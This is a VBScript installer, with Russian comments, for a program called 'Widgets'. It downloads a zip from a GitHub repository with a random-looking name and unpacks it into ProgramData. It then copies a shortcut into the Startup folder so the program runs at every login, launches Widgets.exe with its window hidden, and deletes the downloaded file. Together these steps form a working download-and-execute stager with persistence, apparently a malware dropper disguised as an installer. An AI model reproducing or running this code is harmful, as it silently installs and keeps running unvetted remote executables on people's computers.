Option Explicit

Dim fso, shell, url, zipPath, extractPath
Dim http, adoStream, shellApp

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Путь для скачивания zip
zipPath = shell.ExpandEnvironmentStrings("%TEMP%\widgets.zip")
extractPath = "C:\ProgramData\Widgets"

' URL репозитория
url = "https://codeload.github.com/MGrinxDev/iyuotkjgrcnuiyftvcp-/zip/refs/heads/main"

' --- Скачиваем zip ---
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1 ' Binary
    adoStream.Open
    adoStream.Write http.ResponseBody
    adoStream.SaveToFile zipPath, 2 ' Overwrite
    adoStream.Close
Else
    WScript.Quit
End If

' --- Создаём папку, если нет ---
If Not fso.FolderExists(extractPath) Then
    fso.CreateFolder extractPath
End If

' --- Распаковываем zip ---
Set shellApp = CreateObject("Shell.Application")
shellApp.Namespace(extractPath).CopyHere shellApp.Namespace(zipPath).Items, 16

' --- Перемещаем файлы из подпапки в extractPath с перезаписью ---
Dim subFolder, item, targetFilePath
For Each subFolder In fso.GetFolder(extractPath).SubFolders
    For Each item In subFolder.Files
        targetFilePath = extractPath & "\" & fso.GetFileName(item.Path)
        If fso.FileExists(targetFilePath) Then
            fso.DeleteFile targetFilePath, True
        End If
        fso.MoveFile item.Path, targetFilePath
    Next
    fso.DeleteFolder subFolder.Path, True
Next

' --- Копируем ярлык в автозагрузку ---
Dim startupPath, sourceFile, targetFile
startupPath = shell.SpecialFolders("Startup")
sourceFile = extractPath & "\run.lnk"
targetFile = startupPath & "\" & fso.GetFileName(sourceFile)

If fso.FileExists(targetFile) Then fso.DeleteFile targetFile, True
If fso.FileExists(sourceFile) Then fso.CopyFile sourceFile, targetFile, True

' --- Запускаем Widgets.exe ---
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c " & Chr(34) & extractPath & "\Widgets.exe" & Chr(34), 0, False

' --- Удаляем временный zip ---
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
